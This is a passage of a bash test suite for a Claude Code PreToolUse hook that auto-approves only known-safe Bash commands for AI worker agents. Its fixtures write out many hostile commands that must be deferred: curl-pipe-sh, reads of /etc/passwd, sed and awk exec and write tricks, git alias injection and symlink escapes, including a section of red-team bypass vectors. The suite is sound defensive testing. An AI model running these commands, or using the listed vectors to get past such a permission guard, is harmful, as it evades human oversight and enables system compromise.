#!/bin/bash
# Tests for scripts/worker-command-guard.sh — the deterministic PreToolUse
# auto-approve hook (worker-permission-ergonomics Task 1; REQ-A1.1..A1.10,
# REQ-B1.1..B1.7). The hook reads a Claude Code PreToolUse payload on stdin,
# extracts tool_name / tool_input.command via jq, and prints a
# `permissionDecision: allow` decision ONLY for an enumerated set of known-safe
# Bash command shapes, deferring (empty stdout, exit 0) for everything else.
#
# The security-critical target is ZERO false-allows. This adversarial suite is
# the primary evidence (REQ-B1.6): every fixture asserts either ALLOW (a
# known-safe shape) or DEFER (everything else), the corpus includes the
# kickoff-surfaced false-allow vectors (REQ-A1.4/A1.8/A1.9/A1.10) and a
# deny-precedence collision case derived from config/worker-settings.json, and
# the fallthrough branch is asserted to be defer by construction.
#
# Contract under test:
#   ALLOW  <=> exit 0 AND stdout carries a well-formed
#              "permissionDecision": "allow" object.
#   DEFER  <=> exit 0 AND stdout is empty/whitespace (no decision).
#   The hook NEVER exits non-zero and NEVER emits deny/ask (REQ-A1.2, B1.7).
set -u
unset CDPATH
LC_ALL=C
export LC_ALL

REPO_ROOT="$(cd "$(dirname "$0")/.." && pwd)"
HOOK="$REPO_ROOT/scripts/worker-command-guard.sh"

failures=0
passes=0
false_allows=0

pass() {
  echo "ok: $1"
  passes=$((passes + 1))
}
fail() {
  echo "FAIL: $1" >&2
  failures=$((failures + 1))
}

if ! command -v jq >/dev/null 2>&1; then
  echo "FAIL: jq is required to run this suite" >&2
  exit 1
fi
if [ ! -f "$HOOK" ]; then
  echo "FAIL: hook script missing at $HOOK" >&2
  exit 1
fi

# Default cwd for containment: a scratch repo with a .git marker and a
# scripts/ + tests/ dir so in-repo script/bats paths resolve inside it.
SANDBOX="$(mktemp -d)" || exit 1
trap 'rm -rf "$SANDBOX"' EXIT
mkdir -p "$SANDBOX/scripts" "$SANDBOX/tests" "$SANDBOX/sub"
: >"$SANDBOX/.git" # worktree-style .git file marker
: >"$SANDBOX/scripts/ok.sh"
: >"$SANDBOX/tests/ok.bats"
# Symlinked final components pointing OUTSIDE the repo (containment escape).
ln -sf /etc/hosts "$SANDBOX/scripts/evillink.sh"
ln -sf /etc/hosts "$SANDBOX/tests/evillink.bats"

# A simulated INSTALLED planwright root (is_planwright_script's allowance) plus
# the two decoys its containment check must reject: a sibling directory that
# merely shares the root's name PREFIX, and a symlinked leaf pointing outside
# the root. `PLUGIN_CWD` is a separate repo checkout, so a plugin-root path can
# only ever pass via the plugin arm, never via repo containment.
PLUGIN_ROOT="$SANDBOX/install/planwright"
PLUGIN_DECOY="$SANDBOX/install/planwright-evil"
PLUGIN_CWD="$SANDBOX/install/checkout"
mkdir -p "$PLUGIN_ROOT/scripts" "$PLUGIN_ROOT/tests" "$PLUGIN_DECOY/scripts" \
  "$PLUGIN_CWD" "$SANDBOX/install/outside"
: >"$PLUGIN_CWD/.git"
: >"$PLUGIN_ROOT/scripts/plug.sh"
: >"$PLUGIN_ROOT/scripts/plug.py"
: >"$PLUGIN_ROOT/tests/plug.sh"
: >"$PLUGIN_ROOT/notscripts.sh"
: >"$PLUGIN_DECOY/scripts/plug.sh"
: >"$SANDBOX/install/outside/evil.sh"
ln -sf "$SANDBOX/install/outside/evil.sh" "$PLUGIN_ROOT/scripts/evillink.sh"

# Extra environment applied to the hook by run_hook. Used only by the
# root-resolution fixtures (PLANWRIGHT_ROOT / CLAUDE_PLUGIN_ROOT / CLAUDE_DIR);
# reset to empty after each so no other fixture inherits it.
HOOK_ENV=()

# run_hook <command> [tool_name] [cwd] -> sets OUT and CODE
run_hook() {
  local cmd="$1"
  local tool="${2:-Bash}"
  local cwd="${3:-$SANDBOX}"
  local payload
  payload="$(jq -n --arg c "$cmd" --arg t "$tool" --arg w "$cwd" \
    '{tool_name:$t, tool_input:{command:$c}, cwd:$w}')"
  OUT="$(printf '%s' "$payload" | env ${HOOK_ENV[@]+"${HOOK_ENV[@]}"} /bin/bash "$HOOK" 2>/dev/null)"
  CODE=$?
}

# is_allow: OUT carries a well-formed allow decision.
is_allow() {
  printf '%s' "$OUT" | grep -Eq '"permissionDecision"[[:space:]]*:[[:space:]]*"allow"'
}
# is_empty: OUT is empty or whitespace only.
is_empty() {
  [ -z "$(printf '%s' "$OUT" | tr -d '[:space:]')" ]
}
# has_deny_or_ask: OUT ever emits deny/ask (must NEVER happen).
has_deny_or_ask() {
  printf '%s' "$OUT" | grep -Eq '"permissionDecision"[[:space:]]*:[[:space:]]*"(deny|ask)"'
}

# Every assertion also enforces the universal invariants: exit 0, never
# deny/ask (REQ-A1.2, B1.7).
check_invariants() {
  local label="$1"
  if [ "$CODE" -ne 0 ]; then
    fail "$label — exit was $CODE, must be 0 (REQ-B1.7)"
    return 1
  fi
  if has_deny_or_ask; then
    fail "$label — emitted deny/ask, hook is allow-only (REQ-A1.2)"
    return 1
  fi
  return 0
}

# assert_allow <label> <command> [tool] [cwd]
assert_allow() {
  local label="$1"
  run_hook "$2" "${3:-Bash}" "${4:-$SANDBOX}"
  check_invariants "$label" || return
  if is_allow; then
    pass "$label"
  else
    fail "$label — expected ALLOW, got defer/other"
  fi
}

# assert_defer <label> <command> [tool] [cwd]
assert_defer() {
  local label="$1"
  run_hook "$2" "${3:-Bash}" "${4:-$SANDBOX}"
  check_invariants "$label" || return
  if is_empty; then
    pass "$label"
  else
    if is_allow; then
      fail "$label — FALSE-ALLOW: expected DEFER, hook approved it"
      false_allows=$((false_allows + 1))
    else
      fail "$label — expected DEFER (empty), got non-empty non-allow output"
    fi
  fi
}

echo "### REQ-A1.7 — Bash-only; every other tool defers"
assert_defer "non-Bash Read defers" "cat /etc/passwd" "Read"
assert_defer "non-Bash Write defers" "shellcheck scripts/ok.sh" "Write"
assert_defer "non-Bash Edit defers" "git status" "Edit"

echo "### REQ-A1.1/A1.5 — enumerated known-safe shapes ALLOW"
assert_allow "cat file" "cat README.md"
assert_allow "head file" "head -n 20 file.txt"
assert_allow "tail file" "tail -5 file.txt"
assert_allow "wc" "wc -l file"
assert_allow "grep" "grep -n foo file"
assert_allow "grep recursive" "grep -rn foo src/"
assert_allow "printf" "printf '%s\\n' hello"
assert_allow "echo" "echo hello world"
assert_allow "pwd" "pwd"
assert_allow "ls" "ls -la"
assert_allow "true" "true"
assert_allow "test" "test -f file"
assert_allow "sort plain" "sort file"
assert_allow "uniq one operand" "uniq file"
assert_allow "sed read-only substitution" "sed 's/foo/bar/' file"
assert_allow "sed -n print" "sed -n '1,5p' file"
assert_allow "find read-only" "find . -name '*.sh' -type f"
assert_allow "git status" "git status"
assert_allow "git log flags" "git log --oneline -20 --author=x"
assert_allow "git diff" "git diff HEAD~1"
assert_allow "git branch bare" "git branch"
assert_allow "git branch list flag" "git branch -a"
assert_allow "git branch --contains listing arg" "git branch --contains HEAD"
assert_allow "git branch --merged listing arg" "git branch --merged main"
assert_allow "git branch --points-at listing arg" "git branch --points-at HEAD"
assert_defer "git branch newname creates" "git branch newbranch"
assert_defer "git branch -m rename" "git branch -m old new"
assert_allow "git config --get" "git config --get user.name"
assert_allow "git stash list" "git stash list"
assert_allow "git tag list" "git tag -l"
assert_allow "gh pr view" "gh pr view 5"
assert_allow "gh pr list" "gh pr list"
assert_allow "gh pr checks" "gh pr checks"
assert_allow "gh auth status" "gh auth status"
assert_allow "shellcheck" "shellcheck scripts/ok.sh"
assert_allow "markdownlint" "markdownlint README.md"
assert_allow "yamllint" "yamllint ."
assert_allow "mise run" "mise run check"
assert_allow "mise run scoped task" "mise run lint:shell"
assert_allow "mise tasks" "mise tasks"
assert_defer "mise run --shell exec override" "mise run --shell '/usr/bin/touch x' check"
assert_defer "mise run -s short exec override" "mise run -s '/bin/sh' check"
assert_defer "mise run -ns bundled shell" "mise run -ns '/bin/sh' check"
assert_defer "mise --shell global position" "mise --shell '/bin/sh' run check"
assert_defer "mise exec arbitrary" "mise exec -- rm -rf x"
assert_defer "mise x arbitrary" "mise x node -- rm"
# `mise tasks` is a subcommand TREE, not a read-only leaf: edit/add/run mutate
# or exec; only the display leaves and bare listing are read-only (REQ-A1.5/A1.6).
assert_defer "mise tasks edit launches EDITOR" "mise tasks edit foo"
assert_defer "mise tasks add writes task file" "mise tasks add newtask -- echo hi"
assert_defer "mise tasks run --shell override" "mise tasks run hello --shell /bin/sh"
assert_defer "mise tasks run -s override" "mise tasks run hello -s '/bin/sh'"
assert_defer "mise tasks unknown leaf" "mise tasks frobnicate"
assert_allow "mise tasks ls reads" "mise tasks ls"
assert_allow "mise tasks deps reads" "mise tasks deps"
assert_allow "mise tasks info reads" "mise tasks info build"
assert_allow "mise tasks run safe task allows" "mise tasks run check"
assert_allow "direct repo script" "scripts/ok.sh"
assert_allow "bash repo script" "bash scripts/ok.sh"
assert_allow "sh repo script with args" "sh scripts/ok.sh arg1 arg2"
assert_allow "bats repo test" "bats tests/ok.bats"
assert_allow "bats safe flag --tap" "bats --tap tests/ok.bats"
assert_defer "bats --formatter=path exec/containment escape" "bats --formatter=/tmp/evil.sh tests/ok.bats"
assert_defer "bats -F space form" "bats -F /tmp/evil.sh tests/ok.bats"
assert_defer "bats --report-formatter=path" "bats --report-formatter=/tmp/evil.sh tests/ok.bats"
assert_defer "bats --setup-suite-file=path" "bats --setup-suite-file=/tmp/evil.bash tests/ok.bats"
assert_defer "bats --output dir write" "bats --output=/tmp tests/ok.bats"

echo "### REQ-A1.5 — control structures with verified bodies ALLOW"
assert_allow "for loop safe body" "for f in a b c; do echo \$f; done"
assert_allow "for loop shellcheck" "for f in a b c; do shellcheck scripts/ok.sh; done"
assert_allow "while safe" "while true; do echo hi; done"
assert_allow "if safe" "if git status; then echo clean; fi"
assert_allow "case safe" "case x in a) echo a ;; *) echo other ;; esac"

echo "### REQ-A1.5 — fish -c recursion"
assert_allow "fish -c safe inner" "fish -c 'git status'"
assert_defer "fish -c unsafe inner" "fish -c 'rm -rf x'"
assert_defer "fish -c buried unsafe" "fish -c 'fish -c \"rm -rf x\"'"
assert_defer "fish bare-paren substitution" "fish -c 'echo (rm -rf x)'"
assert_defer "fish --command long form" "fish --command 'git status'"

echo "### REQ-A1.4 — every-segment-safe compound analysis"
assert_allow "safe compound &&" "git status && git log"
assert_allow "safe pipe" "cat file | grep foo | wc -l"
assert_allow "safe semicolons" "echo a; echo b; echo c"
assert_defer "one unsafe segment (regression echo;rm)" "echo ok; rm -rf x"
assert_defer "unsafe in pipe" "cat file | rm -rf x"
assert_defer "unsafe after &&" "git status && rm file"
assert_defer "unbalanced single quote" "echo 'unterminated"
assert_defer "command substitution dollar-paren" "echo \$(rm -rf x)"
assert_defer "command substitution backtick" "echo \`rm -rf x\`"
assert_defer "process substitution input" "diff <(rm a) b"
assert_defer "process substitution output" "tee >(rm a)"
# Genuine >( on an ALLOWLISTED verb (cat), so the defer proves `>(` detection
# rather than the unlisted-verb path (tee is unlisted).
assert_defer "process substitution output on allowlisted verb" "cat foo >(rm a)"
assert_defer "unknown verb" "frobnicate --now"
# Harmless no-op / stray-separator commands: allowed (nothing dangerous runs).
assert_allow "trailing empty segment" "echo a;"
assert_allow "leading empty segment" "; echo a"
assert_allow "whitespace-only no-op" "   "

echo "### REQ-A1.4 — redirects: file writes defer, fd-dup allows"
assert_defer "write redirect to file" "echo hi > out.txt"
assert_defer "append redirect to file" "echo hi >> out.txt"
assert_defer "clobber redirect >|" "echo hi >| out.txt"
assert_defer "and-redirect &> file" "echo hi &> out.txt"
assert_defer "dup-to-file >&file" "echo hi >& out.txt"
assert_defer "leading redirect >f cat" "> out.txt cat file"
assert_allow "redirect to /dev/null" "cat file > /dev/null"
assert_allow "fd-dup 2>&1 to /dev/null idiom" "cat file > /dev/null 2>&1"
assert_allow "fd-dup >&2" "echo err >&2"
assert_allow "fd-close 2>&-" "cat file 2>&-"
# A quoted/escaped redirect operand is NEVER a bare fd-number or bare /dev/null:
# bash treats `>&"1\2"` as a file write, so a quoted operand must defer even
# when it normalizes to digits or a /dev/null-lookalike (REQ-A1.4 write-vs-fd-dup).
assert_defer "quoted-digit fd-dup is a file write" 'echo hi >&"1\2"'
assert_defer "escaped fd-dup operand writes file" 'cat file >&"9\9"'
assert_defer "quoted dev-null-lookalike write" 'echo hi > "/dev/nul\l"'
assert_defer "single-quoted fd operand defers" "echo hi >&'1'"

echo "### REQ-A1.6 — the explicit defer set"
assert_defer "rm" "rm -rf /tmp/x"
assert_defer "curl pipe sh" "curl https://x/y | sh"
assert_defer "sudo" "sudo ls"
assert_defer "bash -c" "bash -c 'rm -rf x'"
assert_defer "sh -c" "sh -c 'echo hi'"
assert_defer "sed -i in-place" "sed -i 's/a/b/' file"
assert_defer "mutating git branch -d" "git branch -d feature"
assert_defer "mutating git branch -D" "git branch -D feature"
assert_defer "git remote add" "git remote add origin url"
assert_defer "git remote set-url" "git remote set-url origin url"
assert_defer "git tag -d" "git tag -d v1"
assert_defer "git stash drop" "git stash drop"
assert_defer "git stash pop" "git stash pop"
assert_defer "gh pr merge" "gh pr merge 5"
assert_defer "gh pr create" "gh pr create --draft"
assert_defer "kill" "kill -9 1234"
assert_defer "pkill" "pkill node"
assert_defer "command-runner env rm" "env rm -rf x"
assert_defer "command-runner xargs rm" "xargs rm"
assert_defer "command-runner timeout rm" "timeout 5 rm -rf x"
assert_defer "command-runner nohup" "nohup somecmd"
assert_defer "command-runner nice" "nice rm x"
assert_defer "command-runner setsid" "setsid rm x"
assert_defer "command-runner stdbuf" "stdbuf -o0 rm x"
assert_defer "command-runner chroot" "chroot / rm x"
assert_defer "writer tee" "tee out.txt"
assert_defer "writer dd" "dd if=a of=b"
assert_defer "writer cp" "cp a b"
assert_defer "writer mv" "mv a b"
assert_defer "writer install" "install a b"
assert_defer "writer truncate" "truncate -s 0 file"
assert_defer "writer ln" "ln -s a b"
assert_defer "writer touch" "touch file"
assert_defer "sed write command w file" "sed 'w evil' file"
assert_defer "sed s///w write flag" "sed 's/a/b/w evil' file"
assert_defer "awk print to file" "awk 'BEGIN{print > \"f\"}'"
assert_defer "awk system exec" "awk 'BEGIN{system(\"rm -rf x\")}'"

echo "### REQ-A1.8 — safe-invocation rule: unknown flag/output arg defers"
assert_defer "sort -o output file" "sort -o out.txt file"
assert_defer "sort --output" "sort --output=out.txt file"
assert_defer "sort --compress-program exec (=form)" "sort -S1 --compress-program=/tmp/evil.sh file"
assert_defer "sort --compress-program exec (space form)" "sort --compress-program /tmp/evil.sh file"
assert_allow "sort -S small buffer still allows" "sort -S1 file"
assert_defer "uniq IN OUT" "uniq in.txt out.txt"
assert_defer "markdownlint --fix" "markdownlint --fix README.md"
assert_defer "markdownlint-cli2 --fix" "markdownlint-cli2 --fix ."
assert_defer "date -s set clock" "date -s '2020-01-01'"
assert_defer "file -C compile" "file -C -m magic"
assert_defer "find -okdir" "find . -okdir rm {} ;"
assert_defer "find -fls" "find . -fls out.txt"
assert_defer "find -fprint" "find . -fprint out.txt"
assert_defer "git pre-subcommand -c" "git -c core.pager=cat log"
assert_defer "git alias injection -c" "git -c alias.x='!rm -rf x' x"
assert_defer "git -C elsewhere" "git -C /elsewhere log"
assert_defer "git --exec-path" "git --exec-path=/tmp log"
assert_defer "git --git-dir" "git --git-dir=/x status"
assert_allow "sort plain input (guard is per-invocation)" "sort input.txt"

echo "### Red-team regressions — confirmed exec/write vectors (must DEFER)"
# git grep --open-files-in-pager / -O runs a command through the shell.
assert_defer "git grep -O bundled exec" "git grep -O'sh -c id' foo"
assert_defer "git grep --open-files-in-pager exec" "git grep --open-files-in-pager=id foo"
assert_defer "git log --ext-diff driver exec" "git log --ext-diff"
assert_defer "git show --textconv driver exec" "git show --textconv HEAD:f"
assert_defer "git cat-file --filters driver exec" "git cat-file --filters --path=f HEAD:f"
assert_allow "git cat-file batch still reads" "git cat-file --batch"
assert_allow "git grep plain still allows" "git grep foo"
# GNU sed 'e' substitution flag executes the pattern space (no trailing space).
assert_defer "sed s///e exec no-space" "sed 's/.*/id/e'"
assert_defer "sed s///e exec with file" "sed 's/.*/whoami/e' scripts/ok.sh"
assert_defer "sed standalone e exec" "sed 'e id'"
# sed s///w<file> write flag needs no space before the filename.
assert_defer "sed s///w write no-space" "sed 's/hello/HACKED/wout.txt' scripts/ok.sh"
assert_defer "sed s///w custom delimiter" "sed 's|a|b|wout.txt'"
assert_defer "sed -e bundled write flag" "sed -e 's/a/b/w f'"
assert_defer "sed W write command" "sed 's/a/b/W out'"
assert_defer "sed r read arbitrary file" "sed '1r /etc/passwd'"
assert_defer "sed -f external script file" "sed -f attacker.sed file"
assert_defer "sed -nf bundled external script" "sed -nf attacker.sed file"
assert_defer "sed a append text-region" "sed '1a\\ hello'"
assert_allow "sed -n -e separate expression allows" "sed -n -e 's/a/b/' file"
assert_allow "sed y transliterate allows" "sed 'y/abc/xyz/' file"
# sed bracket-expression delimiter desync (second red-team): [/] hides the
# delimiter and smuggles w/e. The scanner is bracket-AWARE (sed_bracket_end), so
# a bracket expression no longer bails the whole script — it is scanned, and the
# w/r/e screen behind it is what decides. Every desync vector below still defers,
# now for the right reason (the write/exec command, not the mere `[`).
assert_defer "sed bracket hides exec" "echo / | sed '/[/]/e touch pwned'"
assert_defer "sed bracket hides write" "sed '/[/]/w victim.txt' f"
assert_defer "sed bracket in s-pattern" "sed 's/[/]x/g'"
assert_defer "sed bracket via fish recursor" "fish -c 'sed \"/[/]/e touch pwned\" f'"
# git symbolic-ref sets HEAD; reflog expire/delete destroys recovery data.
assert_defer "git symbolic-ref sets HEAD" "git symbolic-ref HEAD refs/heads/evil"
assert_defer "git symbolic-ref -d deletes" "git symbolic-ref -d HEAD"
assert_allow "git symbolic-ref reads HEAD" "git symbolic-ref HEAD"
assert_allow "git symbolic-ref --short reads" "git symbolic-ref --short HEAD"
assert_defer "git reflog expire destroys" "git reflog expire --expire=now --all"
assert_defer "git reflog delete destroys" "git reflog delete HEAD@{0}"
assert_allow "git reflog show reads" "git reflog show"
assert_allow "git reflog bare reads" "git reflog"

echo "### Narrowed screen 1 — sed bracket expressions are read-only (paired positives/negatives)"
# POSITIVES: a bracket expression is read-only however it parses, so the screen
# is on sed's write/read-file/exec commands, not on the `[` character.
assert_allow "sed bracket digit class in s-pattern" "sed -E 's/[0-9]//' f"
assert_allow "sed bracket in address" "sed -n '/[0-9]/p' f"
assert_allow "sed POSIX character class" "sed -n '/[[:space:]]/p' f"
assert_allow "sed negated bracket" "sed -E 's/[^0-9]//g' f"
assert_allow "sed leading-] bracket member" "sed 's/[]a]/x/' f"
assert_allow "sed bracket with equivalence class" "sed 's/[[=a=]]/x/' f"
assert_allow "sed bracket plus interval and escape" "sed -E 's/-[0-9a-f]{8}\\.md\$//' f"
assert_allow "sed multiple bracket expressions in one script" "sed -E 's/[0-9]//; s/[a-z]//' f"
assert_allow "sed y after a bracket address" "sed '/[0-9]/y/abc/xyz/' f"
# THE REAL-WORLD CASE (planwright's standing observation-backlog runbook grep):
# the shipped guard could not approve the command planwright's own instructions
# require, because the command carries a bracket expression.
assert_allow "runbook observation-backlog grep (the reported defect)" \
  "ls specs/_observations/entries/ | sed -E 's/^[0-9-]{11}//; s/-[0-9a-f]{8}\\.md\$//'"
# NEGATIVES: the dangerous neighbours of every positive above.
assert_defer "sed w command with a bracket in the FILENAME" "sed '/a/w [x]out.txt' f"
assert_defer "sed bare w command with bracket filename" "sed 'w [x].txt' f"
assert_defer "sed r command with a bracket in the path" "sed '1r /etc/[p]asswd'"
assert_defer "sed e exec after a bracket address" "sed '/[0-9]/e id' f"
assert_defer "sed W write after a bracket address" "sed '/[0-9]/W out' f"
assert_defer "sed R read-file after a bracket address" "sed '/[0-9]/R /etc/passwd' f"
assert_defer "sed s///w write flag after a bracket pattern" "sed 's/[0-9]/x/w out.txt' f"
assert_defer "sed s///e exec flag after a bracket pattern" "sed 's/[0-9]/id/e' f"
assert_defer "sed -i in-place with a bracket pattern" "sed -i 's/[0-9]//' f"
assert_defer "sed -f external script (bracket irrelevant)" "sed -f attacker.sed f"
# A literal `[` in an s/// REPLACEMENT is NOT a bracket expression. Scanning it
# as one would over-consume `/w x` and skip the flag block entirely — a
# false-allow of a file write. The replacement is scanned as a literal region.
assert_defer "sed literal [ in replacement hiding a w flag" "sed 's/a/[/w x]/' f"
assert_defer "sed literal [ in replacement hiding an e flag" "sed 's/a/[/e]/' f"
# Constructs whose extent is NOT identical across sed dialects, or that real sed
# rejects outright: fail closed rather than guess (REQ-B1.3).
assert_defer "sed backslash inside bracket (GNU vs BSD divergence)" "sed 's/[\\]]/x/' f"
assert_defer "sed unterminated bracket expression" "sed 's/[0-9/x/' f"
assert_defer "sed unterminated POSIX class" "sed 's/[[:alpha/x/' f"
# A TERMINATED but INVALID class / collating element / equivalence class is not a
# bracket expression at all (real BSD and GNU sed both reject every form below),
# so its extent is not something the scanner may assume: it defers rather than
# skipping it as if it were valid. Panel finding (codex backend).
assert_defer "sed unknown POSIX class name" "sed 's/[[:bogus:]]/x/' f"
assert_defer "sed POSIX class names are case-sensitive" "sed 's/[[:Alpha:]]/x/' f"
assert_defer "sed empty POSIX class name" "sed 's/[[:]]/x/' f"
assert_defer "sed multi-char collating element" "sed 's/[[.bogus.]]/x/' f"
assert_defer "sed multi-char equivalence class" "sed 's/[[=ab=]]/x/' f"
assert_defer "sed invalid class cannot hide a w command" "sed '/[[:bogus:]]/w out' f"
assert_defer "sed invalid class cannot hide an e command" "sed '/[[.bogus.]]/e id' f"
# …and every VALID form stays allowed (the 12 POSIX classes, single-character
# collating and equivalence elements, negation, and two classes in one bracket).
assert_allow "sed POSIX class alpha" "sed 's/[[:alpha:]]/x/' f"
assert_allow "sed POSIX class xdigit" "sed 's/[[:xdigit:]]/x/' f"
assert_allow "sed negated POSIX class" "sed 's/[^[:digit:]]//g' f"
assert_allow "sed two POSIX classes in one bracket" "sed 's/[[:upper:][:digit:]]//g' f"
assert_allow "sed single-char collating element" "sed 's/[[.a.]]/x/' f"
assert_defer "sed bracket-opening delimiter is unplaceable" "sed 's[a[b[' f"
assert_defer "sed bracket at command position" "sed '[abc]p' f"
assert_defer "sed custom-delimiter address with [ delimiter" "sed '\\[a[p' f"
assert_defer "sed unterminated s command" "sed 's/[0-9]/x' f"

echo "### Narrowed screen 2 — awk read-only filter forms (paired positives/negatives)"
# POSITIVES: the ordinary read-only filter shapes. Every one of these deferred
# before the change (awk was unverified and so wholly absent from the allowlist).
assert_allow "awk regex filter" "ls | awk '/x/'"
assert_allow "awk print literal" "ls | awk '{print 1}'"
assert_allow "awk print field" "awk '{print \$1}' file"
assert_allow "awk -F attached separator" "awk -F: '{print \$1}' /etc/passwd"
assert_allow "awk -F space-form separator" "awk -F , '{print \$2}' file"
assert_allow "awk --field-separator= long form" "awk --field-separator=: '{print \$1}' file"
assert_allow "awk -v assignment" "awk -v n=3 'NR<=n' file"
assert_allow "awk -v attached assignment" "awk -vn=3 'NR<=n' file"
assert_allow "awk NR/NF counting" "awk 'END{print NR}' file"
assert_allow "awk in a pipeline with sort" "ls | awk '{print \$1}' | sort | uniq -c"
assert_allow "awk --posix flag" "awk --posix '{print \$2}' file"
# NEGATIVES: awk's exec and output vectors, and the flags that reach a file.
assert_defer "awk system() exec" "awk 'BEGIN{system(\"rm -rf x\")}'"
assert_defer "awk print redirection >" "awk '{print > \"f\"}' file"
assert_defer "awk print redirection >>" "awk '{print >> \"f\"}' file"
assert_defer "awk printf redirection" "awk '{printf \"%s\", \$1 > \"f\"}' file"
assert_defer "awk print pipe to command" "awk '{print | \"sh\"}' file"
assert_defer "awk command | getline exec" "awk 'BEGIN{\"id\" | getline x; print x}'"
assert_defer "awk coprocess |& exec" "awk 'BEGIN{print \"x\" |& \"cat\"}'"
assert_defer "awk close()" "awk 'BEGIN{close(\"f\")}'"
assert_defer "awk @load extension" "awk '@load \"filefuncs\"; BEGIN{print 1}'"
assert_defer "awk ENVIRON decants the environment" "awk 'BEGIN{print ENVIRON[\"PATH\"]}'"
assert_defer "awk -f external program file" "awk -f prog.awk file"
assert_defer "awk -f attached program file" "awk -fprog.awk file"
assert_defer "awk --file= external program" "awk --file=prog.awk file"
assert_defer "awk --source inline (unverified position)" "awk --source '{print}' file"
assert_defer "awk -p profile writes a file" "awk -p prof.out '{print}' file"
assert_defer "awk -o pretty-print writes a file" "awk -o out.awk '{print}' file"
assert_defer "awk -d dump-variables writes a file" "awk -d vars.out '{print}' file"
assert_defer "awk -l loads a shared library" "awk -l filefuncs '{print}' file"
assert_defer "awk -i includes a source file" "awk -i inc.awk '{print}' file"
assert_defer "awk -E terminates option processing with a progfile" "awk -E prog.awk"
assert_defer "awk with no inline program" "awk -F:"
assert_defer "awk dangling -v" "awk -v"
assert_defer "awk unplaceable -v assignment" "awk -v '1x=2' '{print}' file"
assert_defer "awk bundled -vF token is not an assignment" "awk -vF '{print}' file"
assert_defer "awk unknown flag" "awk --frobnicate '{print}' file"
assert_defer "awk shell redirect to a file" "awk '{print}' file > out.txt"
# Deliberate over-defer, documented in awk_program_safe: telling a REDIRECTING
# `>` from a RELATIONAL `>` needs a real awk parser, so any `>` defers. Pinning
# it keeps the fail-closed direction from being "fixed" into a false-allow.
assert_defer "awk relational > over-defers (fail-closed by design)" "awk '\$1 > 5' file"
# Only `awk` is on the allowlist; the gawk/mawk/nawk spellings stay deferred
# (no measured need, and each carries its own extension surface).
assert_defer "gawk spelling is not allowlisted" "gawk '{print}' file"
assert_defer "mawk spelling is not allowlisted" "mawk '{print}' file"

# The new screens must hold through every path that reaches them, not just the
# bare-verb one: the `fish -c` recursor, sed's `-e` / `--expression=` value
# positions, and inert value positions the screens must NOT read as program text.
assert_allow "awk via the fish recursor" "fish -c 'awk \"{print 1}\" f'"
assert_defer "awk system() via the fish recursor" "fish -c 'awk \"BEGIN{system(1)}\" f'"
assert_defer "awk output redirection via the fish recursor" "fish -c 'awk \"{print > 1}\" f'"
assert_allow "sed bracket via --expression=" "sed --expression='s/[0-9]//' f"
assert_defer "sed w flag via --expression=" "sed --expression='s/[0-9]/x/w out' f"
assert_allow "sed bracket via -e value" "sed -e 's/[0-9]//' -e 's/[a-z]//' f"
assert_defer "sed w command via the second -e value" "sed -e 's/[0-9]//' -e 'w out' f"
# A `>` inside an INERT value (a -v assignment, a -F separator) is not program
# text and must not be screened as redirection; the program is what gets screened.
assert_allow "awk -v value containing > is inert data" "awk -v x='> f' '{print x}' file"
assert_allow "awk -F separator containing > is inert data" "awk -F '>' '{print \$2}' file"
assert_defer "awk -v value is inert but the PROGRAM still screens" "awk -v x=1 '{print x > \"f\"}' file"

echo "### Narrowed screen 3 — installed planwright root's scripts/ (paired positives/negatives)"
# POSITIVES: a plugin-script path resolves through the guard's OWN root chain, so
# no per-machine, version-pinned settings allow entry is needed. One fixture per
# arm of that chain.
HOOK_ENV=("PLANWRIGHT_ROOT=$PLUGIN_ROOT")
assert_allow "PLANWRIGHT_ROOT arm — direct script" "$PLUGIN_ROOT/scripts/plug.sh --flag" Bash "$PLUGIN_CWD"
assert_allow "PLANWRIGHT_ROOT arm — bash <script>" "bash $PLUGIN_ROOT/scripts/plug.sh" Bash "$PLUGIN_CWD"
assert_allow "PLANWRIGHT_ROOT arm — in a compound" "$PLUGIN_ROOT/scripts/plug.sh a && $PLUGIN_ROOT/scripts/plug.sh b" Bash "$PLUGIN_CWD"
HOOK_ENV=("CLAUDE_PLUGIN_ROOT=$PLUGIN_ROOT")
assert_allow "CLAUDE_PLUGIN_ROOT arm" "$PLUGIN_ROOT/scripts/plug.sh" Bash "$PLUGIN_CWD"
HOOK_ENV=("CLAUDE_DIR=$SANDBOX/install" "HOME=$SANDBOX/install")
assert_allow "writer-mode <claude-dir>/planwright arm" "$PLUGIN_ROOT/scripts/plug.sh" Bash "$PLUGIN_CWD"
HOOK_ENV=()
# Self-location arm: with NO root env set at all, the hook still resolves its own
# sibling root (dirname $0/..), which is what makes a marketplace install whose
# path carries the plugin version work with zero setup.
assert_allow "self-location arm — the hook's own sibling scripts/" "$REPO_ROOT/scripts/resolve-rule-doc.sh rigor" Bash "$PLUGIN_CWD"
# NEGATIVES: every containment escape and near-miss.
HOOK_ENV=("PLANWRIGHT_ROOT=$PLUGIN_ROOT")
assert_defer "plugin path with .. escaping the root" "$PLUGIN_ROOT/scripts/../../outside/evil.sh" Bash "$PLUGIN_CWD"
assert_defer "plugin path via bash with .. escape" "bash $PLUGIN_ROOT/scripts/../../outside/evil.sh" Bash "$PLUGIN_CWD"
assert_defer "symlinked leaf resolving outside the root" "$PLUGIN_ROOT/scripts/evillink.sh" Bash "$PLUGIN_CWD"
assert_defer "name-PREFIX sibling of the root is a different directory" "$PLUGIN_DECOY/scripts/plug.sh" Bash "$PLUGIN_CWD"
assert_defer "root-level script outside scripts/" "$PLUGIN_ROOT/notscripts.sh" Bash "$PLUGIN_CWD"
assert_defer "plugin tests/ is not a trusted script dir" "$PLUGIN_ROOT/tests/plug.sh" Bash "$PLUGIN_CWD"
assert_defer "non-.sh under the plugin scripts/" "$PLUGIN_ROOT/scripts/plug.py" Bash "$PLUGIN_CWD"
assert_defer "bash -c is still not a script invocation" "bash -c '$PLUGIN_ROOT/scripts/plug.sh'" Bash "$PLUGIN_CWD"
assert_defer "bats on a plugin script stays repo-scoped" "bats $PLUGIN_ROOT/scripts/plug.sh" Bash "$PLUGIN_CWD"
assert_defer "env-assignment prefix on a plugin script" "BASH_ENV=/tmp/x $PLUGIN_ROOT/scripts/plug.sh" Bash "$PLUGIN_CWD"
assert_defer "plugin script writing a file still defers" "$PLUGIN_ROOT/scripts/plug.sh > out.txt" Bash "$PLUGIN_CWD"
HOOK_ENV=("PLANWRIGHT_ROOT=$SANDBOX/install/does-not-exist")
